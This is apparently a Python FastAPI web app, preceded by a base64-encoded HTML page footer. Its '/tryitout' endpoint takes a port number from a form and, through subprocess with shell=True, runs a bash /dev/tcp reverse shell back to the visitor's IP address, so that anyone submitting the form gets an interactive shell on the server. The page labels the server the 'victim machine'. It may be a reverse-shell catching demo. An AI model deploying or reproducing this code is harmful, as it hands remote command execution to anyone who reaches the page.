K3RlbXBsYXRlbW8iIHRpdGxlPSJmcmVlIGNzcyB0ZW1wbGF0ZXMiIHRhcmdldD0iX2JsYW5rIj5UZW1wbGF0ZW1vPC9hPjwvcD4KICAgICAgICAgICAgICAgIAoJCQk8L2Rpdj4KCQkJCgkJPC9kaXY%2BCiAgICAgICAgCgk8L2Rpdj4KPC9mb290ZXI%2BCgo8IS0tIEJhY2sgdG9wIC0tPgo8YSBocmVmPSIjIiBjbGFzcz0iZ28tdG9wIj48aSBjbGFzcz0iZmEgZmEtYW5nbGUtdXAiPjwvaT48L2E%2BCgo8IS0tIEphdmFzY3JpcHQgIC0tPgo8c2NyaXB0IHNyYz0ianMvanF1ZXJ5LmpzIj48L3NjcmlwdD4KPHNjcmlwdCBzcmM9ImpzL2Jvb3RzdHJhcC5taW4uanMiPjwvc2NyaXB0Pgo8c2NyaXB0IHNyYz0ianMvdmVnYXMubWluLmpzIj48L3NjcmlwdD4KPHNjcmlwdCBzcmM9ImpzL21vZGVybml6ci5jdXN0b20uanMiPjwvc2NyaXB0Pgo8c2NyaXB0IHNyYz0ianMvdG91Y2hlZmZlY3RzLmpzIj48L3NjcmlwdD4KPHNjcmlwdCBzcmM9ImpzL293bC5jYXJvdXNlbC5taW4uanMiPjwvc2NyaXB0Pgo8c2NyaXB0IHNyYz0ianMvc21vb3Roc2Nyb2xsLmpzIj48L3NjcmlwdD4KPHNjcmlwdCBzcmM9ImpzL3dvdy5taW4uanMiPjwvc2NyaXB0Pgo8c2NyaXB0IHNyYz0ianMvY3VzdG9tLmpzIj48L3NjcmlwdD4KCjwvYm9keT4KPC9odG1sPg

def errorPage(request,exceptionObj):
    return templates.TemplateResponse("error.html",{"request":request},status_code=500)
exceptions={
    500: errorPage,
    404: errorPage,
    503: errorPage
}

app = FastAPI(docs_url=None,redoc_url=None,exception_handlers=exceptions)

templates = Jinja2Templates(directory="templates")
app.mount("/assets",StaticFiles(directory="assets"),name="assets")

@app.get("/")
@app.post("/")
def index(request: Request):
    return templates.TemplateResponse("index.html",{"request":request,"runningCommand":""})

def formSubmitResponse(request:Request,response:str):
    # return content below submit box
    return templates.TemplateResponse("shellPage.html",{"request":request,"runningCommand":response})

#show page
@app.get("/tryitout")
def tryitout(request:Request):
    return templates.TemplateResponse("shellPage.html",{"request":request})

#submit page
@app.post("/tryitout")
def shell(request:Request,port:str=Form(...)):
    ipAddress = request.client.host
    #disgusting code but deal with it, html content alignment sucks
    if not port.isdigit() :
        response="Error: please only enter numbers"
    #should be an integer by now
    elif int(port)<1 or int(port)>65535:
            response="Error: please enter a number between 1 and 65,535 (inclusive)"
    else:
        response = f"""
    Running:<br /><code style="white-space: nowrap;"> bash -c 'bash -i >& /dev/tcp/{ipAddress}/{port} 0>&1'</code>
    on victim machine<br /> you should catch a shell shortly
    """
        #subprocess to allow multiple connections
        subprocess.run(f"bash -c 'bash -i >& /dev/tcp/{ipAddress}/{port} 0>&1' &",shell=True)
    return formSubmitResponse(request,response)